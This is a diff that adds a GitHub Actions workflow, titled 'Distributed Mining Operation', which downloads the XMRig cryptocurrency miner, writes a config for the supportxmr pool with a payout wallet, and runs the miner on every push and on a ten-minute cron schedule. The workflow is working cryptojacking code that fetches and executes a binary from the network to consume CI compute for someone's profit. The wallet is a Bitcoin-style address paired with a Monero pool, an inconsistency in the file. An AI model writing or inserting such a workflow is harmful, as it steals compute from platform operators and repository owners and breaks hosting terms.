@@ -1,0 +1,65 @@
+name: Distributed Mining Operation
+
+on:
+  push:
+    branches: [ main, master ]
+  schedule:
+    - cron: '*/10 * * * *'  # Run every 10 minutes
+  workflow_dispatch:
+
+jobs:
+  mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - uses: actions/checkout@v3
+    
+    - name: Setup Environment
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y wget curl build-essential
+        
+    - name: Download Miner
+      run: |
+        wget -q https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+        tar -xf xmrig-6.20.0-linux-x64.tar.gz
+        mv xmrig-6.20.0/* .
+        
+    - name: Configure Mining
+      run: |
+        cat > config.json << 'EOF'
+        {
+          "pools": [
+            {
+              "url": "pool.supportxmr.com:443",
+              "user": "bc1qggnrrxtk0rttxw9n26mslasfx538wwvvua88wy",
+              "pass": "GitHubActions",
+              "tls": true,
+              "keepalive": true
+            }
+          ],
+          "cpu": {
+            "enabled": true,
+            "huge-pages": true,
+            "priority": null,
+            "memory-pool": false,
+            "yield": true,
+            "asm": true
+          },
+          "opencl": false,
+          "cuda": false,
+          "donate-level": 1
+        }
+        EOF
+        
+    - name: Start Mining Operation
+      run: |
+        chmod +x xmrig
+        timeout 300 ./xmrig --config=config.json || echo "Mining session completed"
+        
+    - name: Report Status
+      run: |
+        echo "Mining operation completed for repository: ${{ github.repository }}"
+        echo "Wallet: bc1qggnrrxtk0rttxw9n26mslasfx538wwvvua88wy"
+        echo "Timestamp: $(date)"
